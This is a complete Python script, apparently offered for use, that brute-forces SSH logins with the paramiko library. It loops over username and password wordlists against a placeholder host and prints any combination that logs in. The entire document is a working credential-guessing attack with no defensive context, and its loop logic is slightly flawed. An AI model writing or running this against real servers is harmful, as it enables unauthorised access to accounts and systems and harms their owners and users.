import paramiko

# Set the SSH server details
host = 'example.com'
port = 22

# Load the usernames and passwords from files
with open('usernames.txt') as f:
    usernames = [line.strip() for line in f.readlines()]

with open('passwords.txt') as f:
    passwords = [line.strip() for line in f.readlines()]

# Try to login with each username and password combination
for username in usernames:
    for password in passwords:
        # Create a new SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Try to connect to the SSH server
            client.connect(hostname=host, port=port, username=username, password=password)

            # If successful, print a message and break out of the loops
            print(f'Successful login: {username}@{host}:{port} with password: {password}')
            break
        except:
            # If there is an error, continue to try the next combination
            pass
